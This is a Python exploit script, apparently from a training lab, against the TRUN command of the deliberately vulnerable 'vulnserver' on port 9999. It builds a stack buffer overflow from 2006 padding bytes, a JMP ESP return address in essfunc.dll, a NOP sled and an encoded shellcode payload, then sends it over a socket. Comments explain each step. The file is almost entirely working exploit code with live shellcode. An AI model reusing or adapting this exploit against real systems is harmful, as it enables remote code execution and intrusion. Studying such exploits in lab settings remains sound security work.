import socket

# Define the target server IP and Port
target_ip = '192.168.1.136'
target_port = 9999

# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (*\vulnserver\essfunc.dll), 0x0
# The address 0x625011AF is located in the essfunc.dll library, which lacks certain protections like ASLR, Rebase, SafeSEH, and CFG. This makes it a reliable candidate for overwriting EIP.
# The address 0x625011AF is in little endian format (\xAF\x11\x50\x62)
eip_overwrite = b'\xAF\x11\x50\x62'

# This is our shellcode, designed to execute when we gain control of the instruction pointer (EIP). It's essential to ensure that your shellcode avoids bad characters.
buf =  b""
buf += b"\xd9\xe1\xd9\x74\x24\xf4\x5a\x31\xc9\xb8\xbf\xa9"
buf += b"\x52\xbe\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\xfd"
buf += b"\xba\xb0\x4b\xfd\x55\xb6\xb4\xfd\xa5\xd7\x3d\x18"
buf += b"\x94\xd7\x5a\x69\x87\xe7\x29\x3f\x24\x83\x7c\xab"
buf += b"\xbf\xe1\xa8\xdc\x08\x4f\x8f\xd3\x89\xfc\xf3\x72"
buf += b"\x0a\xff\x27\x54\x33\x30\x3a\x95\x74\x2d\xb7\xc7"
buf += b"\x2d\x39\x6a\xf7\x5a\x77\xb7\x7c\x10\x99\xbf\x61"
buf += b"\xe1\x98\xee\x34\x79\xc3\x30\xb7\xae\x7f\x79\xaf"
buf += b"\xb3\xba\x33\x44\x07\x30\xc2\x8c\x59\xb9\x69\xf1"
buf += b"\x55\x48\x73\x36\x51\xb3\x06\x4e\xa1\x4e\x11\x95"
buf += b"\xdb\x94\x94\x0d\x7b\x5e\x0e\xe9\x7d\xb3\xc9\x7a"
buf += b"\x71\x78\x9d\x24\x96\x7f\x72\x5f\xa2\xf4\x75\x8f"
buf += b"\x22\x4e\x52\x0b\x6e\x14\xfb\x0a\xca\xfb\x04\x4c"
buf += b"\xb5\xa4\xa0\x07\x58\xb0\xd8\x4a\x35\x75\xd1\x74"
buf += b"\xc5\x11\x62\x07\xf7\xbe\xd8\x8f\xbb\x37\xc7\x48"
buf += b"\xbb\x6d\xbf\xc6\x42\x8e\xc0\xcf\x80\xda\x90\x67"
buf += b"\x20\x63\x7b\x77\xcd\xb6\x2c\x27\x61\x69\x8d\x97"
buf += b"\xc1\xd9\x65\xfd\xcd\x06\x95\xfe\x07\x2f\x3c\x05"
buf += b"\xc0\x90\x69\x04\x99\x79\x68\x06\x88\x25\xe5\xe0"
buf += b"\xc0\xc5\xa3\xbb\x7c\x7f\xee\x37\x1c\x80\x24\x32"
buf += b"\x1e\x0a\xcb\xc3\xd1\xfb\xa6\xd7\x86\x0b\xfd\x85"
buf += b"\x01\x13\x2b\xa1\xce\x86\xb0\x31\x98\xba\x6e\x66"
buf += b"\xcd\x0d\x67\xe2\xe3\x34\xd1\x10\xfe\xa1\x1a\x90"
buf += b"\x25\x12\xa4\x19\xab\x2e\x82\x09\x75\xae\x8e\x7d"
buf += b"\x29\xf9\x58\x2b\x8f\x53\x2b\x85\x59\x0f\xe5\x41"
buf += b"\x1f\x63\x36\x17\x20\xae\xc0\xf7\x91\x07\x95\x08"
buf += b"\x1d\xc0\x11\x71\x43\x70\xdd\xa8\xc7\x90\x3c\x78"
buf += b"\x32\x39\x99\xe9\xff\x24\x1a\xc4\x3c\x51\x99\xec"
buf += b"\xbc\xa6\x81\x85\xb9\xe3\x05\x76\xb0\x7c\xe0\x78"
buf += b"\x67\x7c\x21"


# This is a sequence of NOP (No Operation) instructions that 'slides' the CPU to the start of the shellcode, ensuring that if EIP lands somewhere in the NOP sled, it eventually reaches the shellcode. Here, we've added a sequence of 20>
nops = b'\x90' * 20

# The buffer is constructed by sending 2006 'A's, followed by the EIP overwrite (address of JMP ESP), then the NOP sled, and finally the shellcode.
buffer = b'A' * 2006 + eip_overwrite + nops + buf

# Command
command = b'TRUN'
command_magic = b' .'

try:
        # Create a socket object and connect to the server
        print('Exploit> Connect to target')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Receive the banner or welcome message from the server
        banner = s.recv(1024).decode('utf-8')
        print(f'Server> {banner}')

        # Shellcode
        print('Exploit> Sending payload')
        shell = command + command_magic + buffer
        s.send(shell)

        # Receive the response
        print('Exploit> The target server is expected to crash. No response will be received.')
        try:
                response = s.recv(1024).decode('utf-8')
                print(f'Server> {response}')
        except Exception as e:
                print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
        # Exception handling
        print(f'An error occurred: {str(e)}')

finally:
        # Close the connection
        s.close()
